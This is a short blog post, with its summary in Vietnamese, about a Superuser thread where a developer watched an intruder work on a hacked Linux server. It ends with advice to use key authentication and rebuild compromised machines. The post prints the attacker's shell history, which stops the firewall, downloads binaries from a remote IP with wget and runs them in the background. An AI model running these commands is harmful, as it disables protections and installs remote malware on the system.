---
layout: post
title:  "Live Hacking attempt thread in StackOverflow"
summary: "Tường thuật trực tiếp diễn biến các thông tin và thao tác mà hacker dùng trên chính 1 server bị hacked."
tags: Tech Security
---
> Thread "Did I just get hacked?": [https://superuser.com/questions/1034137/did-i-just-get-hacked](https://superuser.com/questions/1034137/did-i-just-get-hacked) 

Tường thuật trực tiếp diễn biến các thông tin và thao tác mà hacker dùng trên chính 1 server bị hacked.

```shell
  355  service iptables stop
  356  cd /tmp
  357  wget http://222.186.30.209:65534/yjz1
  358  chmod 0755 /tmp/yjz1
  359  nohup /tmp/yjz1 > /dev/null 2>&1 &
  360  chmod 777 yjz1
  361  ./yjz1
  362  chmod 0755 /tmp/yjz1
  363  nohup /tmp/yjz1 > /dev/null 2>&1 &
  364  chmod 0777 yjz1
  365  chmod u+x yjz1
  366  ./yjz1 &
  367  chmod u+x yjz1
  368  ./yjz1 &
  369  wget http://222.186.30.209:65534/yjz
  370  chmod 0755 /tmp/yjz
  371  nohup /tmp/yjz > /dev/null 2>&1 &
```

> Texts from TheNextWeb: http://thenextweb.com/dd/2016/02/10/developer-watches-as-hackers-break-into-a-server/
>
> ---
>
> If there’s two big takeaways from the post, it’s these:
>
> 1. Use private key authentication on your Linux servers to avoid brute-force attacks
> 2. Once a server like this is compromised, it needs to be destroyed
